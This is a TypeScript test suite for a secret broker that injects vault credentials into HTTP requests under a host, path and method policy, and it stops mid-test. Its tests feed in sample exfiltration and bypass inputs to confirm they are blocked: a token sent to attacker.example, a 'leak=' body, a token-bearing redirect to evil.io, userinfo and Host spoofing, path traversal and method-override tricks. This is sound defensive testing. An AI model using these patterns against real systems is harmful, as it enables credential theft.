import { describe, expect, it } from 'vitest';
import { createBroker, DeniedError, type AuditEvent, type FetchRequest, type SecretSource } from '../src/broker';
import { GrantLogic, ruleKey, type AccessItem, type ApprovalLimits } from '../src/grants';
import type { LoginFields } from '../src/store';
import { MapKv } from './helpers';
import { ALL_METHODS, checkHandle, grantFor, hostMatches, matchRule, pathMatches, revealRule, validatePolicy, type Policy, type Tier } from '../src/policy';
import { makeRedactor } from '../src/redact';

const policy: Policy = validatePolicy({
  rules: [
    { tier: 'personal', secrets: ['GITHUB_TOKEN'], hosts: ['api.github.com'] },
    { tier: 'client-work', secrets: ['HELPDESK_*'], hosts: ['helpdesk.example.com'], methods: ['GET', 'POST'], paths: ['/api/**'] },
    { tier: 'production', secrets: ['PROD_KEY'], hosts: ['*.supabase.co'], methods: ['GET'], paths: ['/rest/v1/*'] },
  ],
});

const VAULT: Record<Tier, Record<string, string>> = {
  personal: { GITHUB_TOKEN: 'ghp_SUPERSECRETVALUE123', OTHER_PERSONAL: 'unrelated-personal-secret', SHORT: 'abc' },
  'client-work': { HELPDESK_ID: 'helpdesk-client-id', HELPDESK_SECRET: 'helpdesk"secret&value', UNLISTED: 'not-in-policy' },
  production: { PROD_KEY: 'prod-service-role-key' },
  sites: { PORTAL: 'portal-pass-9x', API_KEY: 'sites-api-key-value' },
};

const LOGINS: Record<string, LoginFields> = { 'sites/PORTAL': { username: 'agent@example.com', url: 'https://portal.example.com/login' } };

function source(tiers: Tier[] = ['personal', 'client-work', 'production'], links: Record<string, string[]> = {}): SecretSource {
  return {
    vaults: async () => tiers.map((slug) => ({ slug, name: slug, strict: slug === 'production', repos: links[slug] ?? [] })),
    load: async (t: Tier) => {
      if (!tiers.includes(t)) throw new Error(`no vault named ${t}`);
      return new Map(Object.entries(VAULT[t] ?? {}));
    },
    loginInfo: async (t: Tier, n: string) => (tiers.includes(t) ? LOGINS[`${t}/${n}`] ?? null : null),
    readSecret: async (t: Tier, n: string) => {
      if (!tiers.includes(t)) throw new Error(`no vault named ${t}`);
      return VAULT[t]?.[n] ?? null;
    },
  };
}

interface Captured {
  url: string;
  init: RequestInit;
}

function setup(respond: (c: Captured) => Response = () => Response.json({ ok: true }), tiers?: Tier[]) {
  const calls: Captured[] = [];
  const events: AuditEvent[] = [];
  const fetchFn = (async (url: string, init: RequestInit) => {
    const c = { url, init };
    calls.push(c);
    return respond(c);
  }) as unknown as typeof fetch;
  const broker = createBroker({ policy, source: source(tiers), user: 'alice', fetchFn, audit: (e) => events.push(e) });
  return { broker, calls, events };
}

const gh: FetchRequest = {
  url: 'https://api.github.com/user',
  headers: { Authorization: 'Bearer {{secret://personal/GITHUB_TOKEN}}' },
};

describe('policy matching', () => {
  it('validates reveal rules and keeps fetch and reveal rules apart', () => {
    const reveal = { action: 'reveal', tier: 'personal', secrets: ['PORTAL'] };
    expect(validatePolicy({ rules: [reveal] }).rules).toHaveLength(1);
    expect(validatePolicy({ rules: [{ ...reveal, tier: 'production' }] }).rules).toHaveLength(1);
    expect(() => validatePolicy({ rules: [{ ...reveal, hosts: ['a.example.com'] }] })).toThrow(/reveal/);
    expect(() => validatePolicy({ rules: [{ ...reveal, methods: ['GET'] }] })).toThrow(/reveal/);
    expect(() => validatePolicy({ rules: [{ ...reveal, paths: ['/x'] }] })).toThrow(/reveal/);
    expect(() => validatePolicy({ rules: [{ ...reveal, action: 'show' }] })).toThrow(/action/);
    expect(() => validatePolicy({ rules: [{ tier: 'personal', secrets: ['X'] }] })).toThrow(/hosts/);
    const p = validatePolicy({ rules: [reveal, { tier: 'personal', secrets: ['GITHUB_TOKEN', 'PORTAL'], hosts: ['api.github.com'] }] });
    const dest = { host: 'api.github.com', method: 'GET', path: '/' };
    expect(matchRule(p, 'secret://personal/PORTAL', dest)).toBe(p.rules[1]);
    expect(matchRule(p, 'secret://personal/GITHUB_TOKEN', { ...dest, host: 'evil.io' })).toBeNull();
    expect(revealRule(p, 'secret://personal/PORTAL')).toBe(p.rules[0]);
    expect(revealRule(p, 'secret://personal/GITHUB_TOKEN')).toBeNull();
    const revealOnly = validatePolicy({ rules: [reveal] });
    expect(checkHandle(revealOnly, 'secret://personal/PORTAL', dest)).toMatch(/not in the policy/);
    expect(grantFor(revealOnly, 'personal', 'PORTAL')).toBeNull();
    expect(grantFor(p, 'personal', 'PORTAL')!.destinations).toEqual([{ hosts: ['api.github.com'], methods: ALL_METHODS, paths: ['/**'] }]);
  });

  it('gives fetch and reveal rules distinct identities', () => {
    const fetchRule = { tier: 'personal', secrets: ['A'], hosts: ['a.example.com'] };
    expect(ruleKey(fetchRule)).toBe(ruleKey({ ...fetchRule, action: 'fetch' }));
    expect(ruleKey({ action: 'reveal', tier: 'personal', secrets: ['A'] })).not.toBe(ruleKey({ tier: 'personal', secrets: ['A'] }));
  });

  it('matches hosts exactly or by subdomain wildcard', () => {
    expect(hostMatches('api.github.com', 'API.GitHub.com')).toBe(true);
    expect(hostMatches('api.github.com', 'api.github.com.evil.io')).toBe(false);
    expect(hostMatches('*.supabase.co', 'abc.supabase.co')).toBe(true);
    expect(hostMatches('*.supabase.co', 'supabase.co')).toBe(false);
    expect(hostMatches('*.supabase.co', 'evilsupabase.co')).toBe(false);
  });

  it('matches paths with * and **', () => {
    expect(pathMatches('/rest/v1/*', '/rest/v1/jobs')).toBe(true);
    expect(pathMatches('/rest/v1/*', '/rest/v1/jobs/1')).toBe(false);
    expect(pathMatches('/api/**', '/api/tickets/5')).toBe(true);
    expect(pathMatches('/api/**', '/apix')).toBe(false);
  });

  it('rejects unsafe or ambiguous policies', () => {
    const bad = (rule: object) => () => validatePolicy({ rules: [rule] });
    const base = { tier: 'personal', secrets: ['X'], hosts: ['a.example.com'] };
    expect(bad({ ...base, hosts: ['*'] })).toThrow(/hosts/);
    expect(bad({ ...base, hosts: ['*.com'] })).toThrow(/too broad/);
    expect(bad({ ...base, hosts: ['api.*.com'] })).toThrow(/hosts/);
    expect(bad({ ...base, hosts: ['https://a.example.com'] })).toThrow(/hosts/);
    expect(bad({ ...base, tier: 'production' })).toThrow(/production is a strict vault/);
    expect(bad({ ...base, tier: 'Not_Valid' })).toThrow(/vault name/);
    expect(() => validatePolicy({ rules: [{ ...base, tier: 'acme' }] }, (v) => v === 'acme')).toThrow(/acme is a strict vault/);
    expect(validatePolicy({ rules: [{ ...base, tier: 'acme' }] }).rules).toHaveLength(1);
    expect(bad({ ...base, paths: ['api/**'] })).toThrow(/paths/);
    expect(() => validatePolicy({})).toThrow();
  });

  it('explains denials', () => {
    expect(checkHandle(policy, 'secret://personal/GITHUB_TOKEN', { host: 'evil.io', method: 'GET', path: '/' })).toMatch(
      /may not be sent to GET evil\.io\/ \(allowed hosts: api\.github\.com\)/,
    );
    expect(checkHandle(policy, 'secret://personal/NOPE', { host: 'api.github.com', method: 'GET', path: '/' })).toMatch(/not in the policy/);
  });
});

describe('secret_fetch', () => {
  it('injects the secret and redacts it from the response', async () => {
    const { broker, calls, events } = setup((c) =>
      Response.json({ echoed: new Headers(c.init.headers).get('authorization'), other: 'unrelated-personal-secret' }),
    );
    const res = await broker.fetch(gh);
    expect(new Headers(calls[0]!.init.headers).get('authorization')).toBe('Bearer ghp_SUPERSECRETVALUE123');
    expect(calls[0]!.init.redirect).toBe('manual');
    expect(res.body).not.toContain('ghp_SUPERSECRETVALUE123');
    expect(res.body).toContain('[redacted:secret://personal/GITHUB_TOKEN]');
    expect(res.body).not.toContain('unrelated-personal-secret');
    expect(events).toEqual([
      expect.objectContaining({ outcome: 'allowed', host: 'api.github.com', handles: ['secret://personal/GITHUB_TOKEN'], status: 200 }),
    ]);
    expect(JSON.stringify(events)).not.toContain('ghp_');
  });

  it('redacts base64 and url-encoded echoes', async () => {
    const b64 = btoa('ghp_SUPERSECRETVALUE123');
    const { broker } = setup(() => new Response(`a ${b64} b ${encodeURIComponent('helpdesk"secret&value')}`, { headers: { 'content-type': 'text/plain' } }));
    const res = await broker.fetch(gh);
    expect(res.body).not.toContain(b64);
    const res2 = await setup(() => new Response(`${encodeURIComponent('helpdesk"secret&value')}`, { headers: { 'content-type': 'text/plain' } })).broker.fetch({
      url: 'https://helpdesk.example.com/api/x?k={{secret://client-work/HELPDESK_SECRET}}',
    });
    expect(res2.body).toBe('[redacted:secret://client-work/HELPDESK_SECRET]');
  });

  it('refuses to send a secret to a host the policy does not name', async () => {
    const { broker, calls, events } = setup();
    await expect(broker.fetch({ ...gh, url: 'https://attacker.example/collect' })).rejects.toThrow(/may not be sent/);
    expect(calls).toHaveLength(0);
    expect(events[0]).toMatchObject({ outcome: 'denied', host: 'attacker.example' });
  });

  it('enforces methods and paths', async () => {
    const { broker, calls } = setup();
    const prod = (url: string, method: string) =>
      broker.fetch({ url, method, headers: { apikey: '{{secret://production/PROD_KEY}}' } });
    await expect(prod('https://x.supabase.co/rest/v1/jobs', 'DELETE')).rejects.toThrow(/may not be sent/);
    await expect(prod('https://x.supabase.co/auth/v1/admin/users', 'GET')).rejects.toThrow(/may not be sent/);
    await prod('https://x.supabase.co/rest/v1/jobs?select=*', 'GET');
    expect(calls).toHaveLength(1);
  });

  it('blocks host, port, userinfo, path tricks and non-https', async () => {
    const { broker, calls } = setup();
    const h = { Authorization: 'Bearer {{secret://personal/GITHUB_TOKEN}}' };
    for (const url of [
      'http://api.github.com/user',
      'https://{{secret://personal/GITHUB_TOKEN}}.api.github.com/',
      'https://api.github.com:8443/user',
      'https://evil.io@api.github.com/user',
      'https://api.github.com/{{secret://personal/GITHUB_TOKEN}}',
      'https://api.github.com/a/../b',
      'https://api.github.com/a%2fb',
      'ftp://api.github.com/',
    ]) {
      await expect(broker.fetch({ url, headers: h }), url).rejects.toThrow();
    }
    await expect(broker.fetch({ ...gh, headers: { ...h, Host: 'evil.io' } })).rejects.toThrow(/Host may not be set/);
    expect(calls).toHaveLength(0);
  });

  it('requires every handle in a request to be allowed for that destination', async () => {
    const { broker, calls } = setup();
    await expect(
      broker.fetch({ ...gh, body: 'leak={{secret://client-work/HELPDESK_SECRET}}', method: 'POST' }),
    ).rejects.toThrow(/HELPDESK_SECRET may not be sent/);
    expect(calls).toHaveLength(0);
  });

  it('denies handles outside the policy even if they exist in the vault', async () => {
    const { broker } = setup();
    await expect(
      broker.fetch({ url: 'https://helpdesk.example.com/api/x', headers: { X: '{{secret://client-work/UNLISTED}}' } }),
    ).rejects.toThrow(/not in the policy/);
  });

  it('denies requests with no placeholders (not an open proxy)', async () => {
    const { broker } = setup();
    await expect(broker.fetch({ url: 'https://api.github.com/user' })).rejects.toThrow(/no \{\{secret/);
  });

  it('encodes values for their context', async () => {
    const { broker, calls } = setup();
    await broker.fetch({
      url: 'https://helpdesk.example.com/api/token?id={{secret://client-work/HELPDESK_ID}}&s={{secret://client-work/HELPDESK_SECRET}}',
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: '{"client_secret":"{{secret://client-work/HELPDESK_SECRET}}"}',
    });
    const c = calls[0]!;
    expect(new URL(c.url).searchParams.get('s')).toBe('helpdesk"secret&value');
    expect(new URL(c.url).hostname).toBe('helpdesk.example.com');
    expect(JSON.parse(String(c.init.body))).toEqual({ client_secret: 'helpdesk"secret&value' });
  });

  it('supports basic auth and redacts the encoded pair', async () => {
    const { broker, calls } = setup((c) => new Response(new Headers(c.init.headers).get('authorization'), { headers: { 'content-type': 'text/plain' } }));
    const res = await broker.fetch({
      url: 'https://helpdesk.example.com/api/me',
      basic_auth: { username: '{{secret://client-work/HELPDESK_ID}}', password: '{{secret://client-work/HELPDESK_SECRET}}' },
    });
    expect(new Headers(calls[0]!.init.headers).get('authorization')).toBe(`Basic ${btoa('helpdesk-client-id:helpdesk"secret&value')}`);
    expect(res.body).not.toContain(btoa('helpdesk-client-id:helpdesk"secret&value'));
  });

  it('does not follow redirects and redacts Location', async () => {
    const { broker } = setup(
      () => new Response(null, { status: 302, headers: { Location: 'https://evil.io/?t=ghp_SUPERSECRETVALUE123' } }),
    );
    const res = await broker.fetch(gh);
    expect(res.status).toBe(302);
    expect(res.headers.location).toBe('https://evil.io/?t=[redacted:secret://personal/GITHUB_TOKEN]');
  });

  it('truncates after redacting and omits binary bodies', async () => {
    const big = 'x'.repeat(99_990) + 'ghp_SUPERSECRETVALUE123';
    const { broker } = setup(() => new Response(big, { headers: { 'content-type': 'text/plain' } }));
    const res = await broker.fetch(gh);
    expect(res.truncated).toBe(true);
    expect(res.body).not.toContain('ghp_SUPER');
    const bin = await setup(() => new Response(new Uint8Array(10), { headers: { 'content-type': 'image/png' } })).broker.fetch(gh);
    expect(bin.body).toBe('[binary response omitted: 10 bytes, image/png]');
  });

  it('reports a missing vault', async () => {
    const { broker } = setup(undefined, ['personal']);
    await expect(
      broker.fetch({ url: 'https://helpdesk.example.com/api/x', headers: { X: '{{secret://client-work/HELPDESK_ID}}' } }),
    ).rejects.toThrow(/could not load client-work secrets: no vault named client-work/);
  });
});

describe('secret_list and status', () => {
  it('lists every name, marks approved ones with destinations, and never returns values', async () => {
    const { broker } = setup();
    const out = await broker.list();
    expect(out.secrets.map((h) => h.handle)).toEqual([
      'secret://personal/GITHUB_TOKEN',
      'secret://personal/OTHER_PERSONAL',
      'secret://personal/SHORT',
      'secret://client-work/HELPDESK_ID',
      'secret://client-work/HELPDESK_SECRET',
      'secret://client-work/UNLISTED',
      'secret://production/PROD_KEY',
    ]);
    expect(out.secrets.find((h) => h.handle.endsWith('UNLISTED'))).toMatchObject({ approved: false, destinations: [] });
    expect(out.secrets.find((h) => h.handle.endsWith('PROD_KEY'))!.destinations[0]).toEqual({
      hosts: ['*.supabase.co'], methods: ['GET'], paths: ['/rest/v1/*'],
    });
    const text = JSON.stringify(out);
    for (const tier of Object.values(VAULT)) for (const v of Object.values(tier)) expect(text).not.toContain(v);
  });

  it('reports vaults', async () => {
    const { broker } = setup(undefined, ['personal']);
    expect(await broker.status()).toEqual({
      user: 'alice',
      vaults: [{ vault: 'personal', name: 'personal', strict: false, linkedRepos: [] }],
      staticRules: 3,
    });
  });
});

describe('per-repo approvals', () => {
  function withGrants(links: Record<string, string[]> = {}) {
    const kv = new MapKv();
    const grants = new GrantLogic(kv, () => 1_000, () => 'req-1');
    const calls: string[] = [];
    const fetchFn = (async (url: string) => {
      calls.push(url);
      return Response.json({ ok: true });
    }) as unknown as typeof fetch;
    const src = source(undefined, links);
    const vaultReqs: unknown[] = [];
    src.requestVault = async (input) => {
      vaultReqs.push(input);
      return { id: 'vreq-1', slug: input.slug };
    };
    const broker = createBroker({ policy: { rules: [] }, grants, source: src, user: 'alice', fetchFn, publicUrl: 'https://sb.example.dev/' });
    return { broker, grants, calls, vaultReqs };
  }
  const helpdesk = { handle: 'secret://client-work/UNLISTED', hosts: ['helpdesk.example.com'] };

  it('denies until approved, then allows only for that repo and host', async () => {
    const { broker, grants, calls } = withGrants();
    const req = { repo: 'acme/helpdesk', url: 'https://helpdesk.example.com/api/x', headers: { A: '{{secret://client-work/UNLISTED}}' } };
    await expect(broker.fetch(req)).rejects.toThrow(/call secret_request_access for repo acme\/helpdesk/);

    const r = await broker.requestAccess({ repo: 'https://github.com/acme/Helpdesk.git', reason: 'ticket sync', items: [helpdesk] });
    expect(r.approvalUrl).toBe('https://sb.example.dev/approve/req-1');
    expect(r.repo).toBe('acme/helpdesk');
    await expect(broker.fetch(req)).rejects.toThrow(/not in the policy/);

    await grants.approve('req-1', [0], 'alice');
    await broker.fetch(req);
    expect(calls).toHaveLength(1);
    await expect(broker.fetch({ ...req, repo: 'acme/other' })).rejects.toThrow(/not in the policy/);
    await expect(broker.fetch({ ...req, url: 'https://evil.io/x' })).rejects.toThrow(/may not be sent/);
    await expect(broker.fetch({ ...req, repo: undefined })).rejects.toThrow(/Pass the repo/);

    const listed = await broker.list('acme/helpdesk');
    expect(listed.secrets.find((s) => s.handle === helpdesk.handle)).toMatchObject({ approved: true });
  });

  it('rejects requests for secrets that do not exist, bad hosts, or production without methods', async () => {
    const { broker } = withGrants();
    await expect(broker.requestAccess({ repo: 'a/b', reason: 'x', items: [{ handle: 'secret://personal/NOPE', hosts: ['a.com'] }] })).rejects.toThrow(/does not exist/);
    await expect(broker.requestAccess({ repo: 'a/b', reason: 'x', items: [{ ...helpdesk, hosts: ['*'] }] })).rejects.toThrow(/hosts/);
    await expect(
      broker.requestAccess({ repo: 'a/b', reason: 'x', items: [{ handle: 'secret://production/PROD_KEY', hosts: ['x.supabase.co'] }] }),
    ).rejects.toThrow(/production is a strict vault/);
    await expect(broker.requestAccess({ repo: 'not a repo', reason: 'x', items: [helpdesk] })).rejects.toThrow(/owner\/name/);
    await expect(broker.requestAccess({ repo: 'a/b', reason: '  ', items: [helpdesk] })).rejects.toThrow(/reason/);
  });
});

describe('logins and limits', () => {
  const repo = 'acme/app';
  const PORTAL = 'secret://sites/PORTAL';
  function withLogins() {
    const kv = new MapKv();
    const clock = { now: 1_000 };
    let n = 0;
    const raw = new GrantLogic(kv, () => clock.now, () => `id${++n}`);
    // Mirrors the Vault Durable Object: createRequest gets isLogin from the store, not the caller.
    const grants = Object.assign(Object.create(raw) as GrantLogic, {
      createRequest: (input: Parameters<GrantLogic['createRequest']>[0]) => raw.createRequest(input, { isLogin: (h: string) => h === PORTAL }),
    });
    const calls: string[] = [];
    const events: AuditEvent[] = [];
    const net = { respond: (): Response => Response.json({ ok: true }) };
    const fetchFn = (async (url: string) => { calls.push(url); return net.respond(); }) as unknown as typeof fetch;
    const src = source(['personal', 'sites']);
    const broker = createBroker({ policy: { rules: [] }, grants, source: src, user: 'alice', fetchFn, audit: (e) => events.push(e), now: () => clock.now, publicUrl: 'https://sb.example.dev' });
    const grant = async (items: AccessItem[], limits: ApprovalLimits = {}) => {
      const r = await broker.requestAccess({ repo, reason: 'sign in', items });
      return grants.approve(r.approvalUrl.split('/').pop()!, items.map((_, i) => i), 'alice', limits);
    };
    return { broker, grants, kv, clock, calls, events, net, src, grant };
  }
  const usesOf = async (g: GrantLogic, i = 0) => (await g.getGrant(repo))!.rules[i]!.usesLeft;
  const form = (h = PORTAL) => ({ repo, url: 'https://portal.example.com/login', method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: `u={{${h}}}&p={{${h}}}` });

  it('reveals an approved login, audits without the password, and keeps reveal and fetch apart', async () => {
    const { broker, events, grant } = withLogins();
    await expect(broker.reveal({ repo, handle: PORTAL })).rejects.toThrow(/call secret_request_access for repo acme\/app/);
    await grant([{ handle: PORTAL, reveal: true }]);
    expect(await broker.reveal({ repo, handle: PORTAL })).toEqual({ username: 'agent@example.com', password: 'portal-pass-9x', url: 'https://portal.example.com/login' });
    expect(events.find((e) => e.event === 'secret_reveal' && e.outcome === 'allowed')).toMatchObject({ repo, handles: [PORTAL], ruleId: 'id2' });
    expect(JSON.stringify(events)).not.toContain('portal-pass-9x');
    await expect(broker.fetch(form())).rejects.toThrow(/not in the policy/);
    await expect(broker.reveal({ repo: 'acme/other', handle: PORTAL })).rejects.toThrow(/not approved for reveal/);
  });

  it('never reveals an API key, at request time or under a static wildcard rule', async () => {
    const { broker } = withLogins();
    await expect(broker.requestAccess({ repo, reason: 'r', items: [{ handle: 'secret://sites/API_KEY', reveal: true }] })).rejects.toThrow(/not a login/);
    const fixed = createBroker({ policy: validatePolicy({ rules: [{ action: 'reveal', tier: 'sites', secrets: ['*'] }] }), source: source(['sites']), user: 'alice' });
    await expect(fixed.reveal({ handle: 'secret://sites/API_KEY' })).rejects.toThrow(/not a login/);
    expect((await fixed.reveal({ handle: PORTAL })).password).toBe('portal-pass-9x');
  });

  it('exhausts and expires reveal grants, and secret_list shows login fields and limits', async () => {
    const { broker, grants, clock, grant } = withLogins();
    await grant([{ handle: PORTAL, reveal: true }], { 0: { uses: 2 } });
    await broker.reveal({ repo, handle: PORTAL });
    expect((await broker.list(repo)).secrets.find((s) => s.handle === PORTAL)).toMatchObject({ kind: 'login', username: 'agent@example.com', url: 'https://portal.example.com/login', approved: false, revealApproved: true, usesLeft: 1 });
    expect((await broker.list(repo)).secrets.find((s) => s.handle === 'secret://sites/API_KEY')!.kind).toBeUndefined();
    await broker.reveal({ repo, handle: PORTAL });
    expect(await usesOf(grants)).toBe(0);
    await expect(broker.reveal({ repo, handle: PORTAL })).rejects.toThrow(/call secret_request_access/);
    await grant([{ handle: PORTAL, reveal: true }], { 0: { ttlMs: 3_600_000 } });
    expect((await broker.list(repo)).secrets.find((s) => s.handle === PORTAL)).toMatchObject({ revealApproved: true, expiresAt: 3_601_000 });
    clock.now = 3_601_000;
    await expect(broker.reveal({ repo, handle: PORTAL })).rejects.toThrow(/call secret_request_access/);
    expect((await broker.list(repo)).secrets.find((s) => s.handle === PORTAL)!.revealApproved).toBe(false);
  });

  it('counts one use per fetch call, counts upstream errors, and refunds when upstream is not reached', async () => {
    const { broker, grants, net, grant } = withLogins();
    await grant([{ handle: PORTAL, hosts: ['portal.example.com'], methods: ['POST'] }], { 0: { uses: 3 } });
    await broker.fetch(form());
    expect(await usesOf(grants)).toBe(2);
    net.respond = () => new Response('no', { status: 500 });
    expect((await broker.fetch(form())).status).toBe(500);
    expect(await usesOf(grants)).toBe(1);
    net.respond = () => { throw new Error('connection reset'); };
    await expect(broker.fetch(form())).rejects.toThrow(/request failed/);
    expect(await usesOf(grants)).toBe(1);
  });

  const REFUSED = 'this approval has expired or is used up; call secret_request_access again';
  async function twoRuleBroker(consume: (id: string, real: () => ReturnType<GrantLogic['consume']>) => ReturnType<GrantLogic['consume']>) {
    const { grants, grant, events } = withLogins();
    let hit = 0;
    const racy = Object.assign(Object.create(grants) as GrantLogic, { consume: (r: string, id: string) => consume(id, () => grants.consume(r, id)) });
    const b = createBroker({ policy: { rules: [] }, grants: racy, source: source(['personal', 'sites']), user: 'alice', fetchFn: (async () => { hit++; return Response.json({}); }) as unknown as typeof fetch, audit: (e) => events.push(e) });
    await grant([{ handle: PORTAL, hosts: ['portal.example.com'] }, { handle: 'secret://sites/API_KEY', hosts: ['portal.example.com'] }], { 0: { uses: 5 }, 1: { uses: 5 } });
    return { grants, b, events, hits: () => hit, run: () => b.fetch({ ...form(), body: 'u={{secret://sites/PORTAL}}&k={{secret://sites/API_KEY}}' }) };
  }

  it('denies, audits and refunds the first rule when a second limited rule is refused', async () => {
    const t = await twoRuleBroker(async (id, real) => (id === 'id3' ? { ok: false, reason: REFUSED } : real()));
    // mcp.ts prefixes "Denied by secret-broker policy:" for exactly this class.
    await expect(t.run()).rejects.toBeInstanceOf(DeniedError);
    await expect(t.run()).rejects.toThrow(REFUSED);
    expect(t.events.filter((e) => e.outcome === 'denied')).toHaveLength(2);
    expect(await usesOf(t.grants, 0)).toBe(5);
    expect(t.hits()).toBe(0);
  });

  it('refunds once and leaks nothing when consume throws a plain Error', async () => {
    const t = await twoRuleBroker(async (id, real) => {
      if (id === 'id3') throw new Error('rpc exploded');
      return real();
    });
    const err = await t.run().catch((e: unknown) => e);
    expect(err).not.toBeInstanceOf(DeniedError);
    expect((err as Error).message).toMatch(/rpc exploded/);
    expect(t.events.some((e) => e.outcome === 'denied')).toBe(false);
    expect(await usesOf(t.grants, 0)).toBe(5);
    expect(t.hits()).toBe(0);
    expect(JSON.stringify(t.events)).not.toContain('portal-pass-9x');
  });

  it('denies a login moved or trashed after approval and refunds the use', async () => {
    const { broker, grants, src, grant } = withLogins();
    await grant([{ handle: PORTAL, reveal: true }], { 0: { uses: 2 } });
    src.readSecret = async () => null;
    await expect(broker.reveal({ repo, handle: PORTAL })).rejects.toThrow(/does not exist in the vault/);
    expect(await usesOf(grants)).toBe(2);
  });

  it('keeps a legacy rule without an id working and never consumes it', async () => {
    const { broker, kv, calls } = withLogins();
    const legacy = { repo, rules: [{ tier: 'sites', secrets: ['PORTAL'], hosts: ['portal.example.com'], approvedAt: 1, approvedBy: 'b' }] };
    await kv.put(`grant:${repo}`, legacy);
    await broker.fetch(form());
    expect(calls).toHaveLength(1);
    expect(await kv.get(`grant:${repo}`)).toEqual(legacy);
  });

  it('stops a single-use fetch approval after one call and drops it from secret_list', async () => {
    const { broker, grant } = withLogins();
    await grant([{ handle: PORTAL, hosts: ['portal.example.com'] }], { 0: { uses: 1 } });
    expect((await broker.fetch(form())).status).toBe(200);
    await expect(broker.fetch(form())).rejects.toThrow(/call secret_request_access/);
    expect((await broker.list(repo)).secrets.find((s) => s.handle === PORTAL)!.approved).toBe(false);
  });
});

describe('redactor', () => {
  it('replaces the longest match first', () => {
    const r = makeRedactor(new Map([['secret://a/LONG', 'abcdef123'], ['secret://a/SHORT', 'abc']]));
    expect(r('abcdef123 abc')).toBe('[redacted:secret://a/LONG] [redacted:secret://a/SHORT]');
  });
});

describe('project vaults', () => {
  function linked() {
    const kv = new MapKv();
    const grants = new GrantLogic(kv, () => 1_000, () => 'req-1');
    const calls: string[] = [];
    const fetchFn = (async (url: string) => {
      calls.push(url);
      return Response.json({ ok: true });
    }) as unknown as typeof fetch;
    const src = source(['personal', 'client-work', 'production'], { 'client-work': ['acme/helpdesk-app'] });
    const broker = createBroker({ policy: { rules: [] }, grants, source: src, user: 'alice', fetchFn, publicUrl: 'https://sb' });
    return { broker, grants, calls };
  }
  const item = { handle: 'secret://client-work/HELPDESK_ID', hosts: ['helpdesk.example.com'] };

  it('hides a linked vault from other repos and refuses to approve it for them', async () => {
    const { broker } = linked();
    const other = await broker.list('acme/other');
    expect(other.vaults.map((v) => v.vault)).toEqual(['personal', 'client-work', 'production'].filter((v) => v !== 'client-work'));
    expect(other.secrets.some((s) => s.handle.startsWith('secret://client-work/'))).toBe(false);
    await expect(broker.requestAccess({ repo: 'acme/other', reason: 'x', items: [item] })).rejects.toThrow(/linked to acme\/helpdesk-app/);
    const mine = await broker.list('acme/helpdesk-app');
    expect(mine.secrets.some((s) => s.handle === item.handle)).toBe(true);
  });

  it('stops working for a repo once it is unlinked, even with an approval', async () => {
    const kv = new MapKv();
    const grants = new GrantLogic(kv, () => 1_000, () => 'req-1');
    const links: Record<string, string[]> = { 'client-work': ['acme/helpdesk-app'] };
    const src = source(['personal', 'client-work', 'production'], links);
    const fetchFn = (async () => Response.json({ ok: true })) as unknown as typeof fetch;
    const broker = createBroker({ policy: { rules: [] }, grants, source: src, user: 'b', fetchFn });
    await grants.createRequest({ repo: 'acme/helpdesk-app', reason: 'r', items: [item], requestedBy: 'b' });
    await grants.approve('req-1', [0], 'b');
    const req = { repo: 'acme/helpdesk-app', url: 'https://helpdesk.example.com/api/x', headers: { A: '{{secret://client-work/HELPDESK_ID}}' } };
    await broker.fetch(req);
    links['client-work'] = ['acme/somewhere-else'];
    await expect(broker.fetch(req)).rejects.toThrow(/not in the policy/);
  });

  it('requests a new vault and returns an approval link', async () => {
    const src = source();
    const vaultReqs: unknown[] = [];
    src.requestVault = async (input) => {
      vaultReqs.push(input);
      return { id: 'vreq-1', slug: input.slug };
    };
    const broker = createBroker({ policy: { rules: [] }, grants: new GrantLogic(new MapKv()), source: src, user: 'alice', publicUrl: 'https://sb.example.dev/' });
    const r = await broker.requestVault({ repo: 'acme/Acme-Dash', name: 'Acme', slug: 'acme-finance', reason: 'client creds' });
    expect(r.approvalUrl).toBe('https://sb.example.dev/approve-vault/vreq-1');
    expect(vaultReqs[0]).toMatchObject({ slug: 'acme-finance', requestedBy: 'alice' });
  });
});

describe('scoped grant hardening', () => {
  async function scoped() {
    const grants = new GrantLogic(new MapKv(), () => 1_000, () => 'req-1');
    const calls: Captured[] = [];
    let respond: (c: Captured) => Response = () => Response.json({ ok: true });
    const fetchFn = (async (url: string, init: RequestInit) => {
      const c = { url, init };
      calls.push(c);
      return respond(c);
    }) as unknown as typeof fetch;
    const broker = createBroker({ policy: { rules: [] }, grants, source: source(), user: 'alice', fetchFn });
    const items = [
      { handle: 'secret://personal/GITHUB_TOKEN', hosts: ['api.example.com'], paths: ['/repos/acme/**'] },
      { handle: 'secret://client-work/UNLISTED', hosts: ['api.example.com'], paths: ['/repos/acme/**'] },
    ];
    await grants.createRequest({ repo: 'acme/app', reason: 'r', items, requestedBy: 'alice' });
    await grants.approve('req-1', [0, 1], 'alice');
    return { broker, calls, setRespond: (f: (c: Captured) => Response) => (respond = f) };
  }
  const base = { repo: 'acme/app', headers: { A: '{{secret://personal/GITHUB_TOKEN}}' } };

  it('still allows a plain scoped request with the secret in the query', async () => {
    const { broker, calls } = await scoped();
    await broker.fetch({ repo: 'acme/app', url: 'https://api.example.com/repos/acme/issues?x={{secret://personal/GITHUB_TOKEN}}' });
    expect(calls).toHaveLength(1);
  });

  it('denies backslashes and control characters hidden in the url', async () => {
    const { broker, calls } = await scoped();
    for (const url of [
      'https://api.example.com\..\admin/x',
      'https://api.example.com/repos/acme/.\t./admin',
      'https://api.example.com/repos/acme/.\n./admin',
    ]) {
      await expect(broker.fetch({ ...base, url }), JSON.stringify(url)).rejects.toThrow();
    }
    expect(calls).toHaveLength(0);
  });

  it('denies method-override headers and the _method query parameter', async () => {
    const { broker, calls } = await scoped();
    const url = 'https://api.example.com/repos/acme/issues';
    for (const h of ['X-HTTP-Method-Override', 'x-method-override']) {
      await expect(broker.fetch({ ...base, url, headers: { ...base.headers, [h]: 'DELETE' } }), h).rejects.toThrow(/may not be set/);
    }
    await expect(broker.fetch({ ...base, url: `${url}?_method=DELETE` })).rejects.toThrow(/_method/);
    await expect(broker.fetch({ ...base, url: `${url}?a=1?_method=DELETE` })).rejects.toThrow(/_method/);
    await expect(broker.fetch({ ...base, url: `${url}?%5FMETHOD=DELETE` })).rejects.toThrow(/_method/);
    expect(calls).toHaveLength(0);
  });

  it('redacts secrets from other granted tiers that the request did not use', async () => {
    const { broker, setRespond } = await scoped();
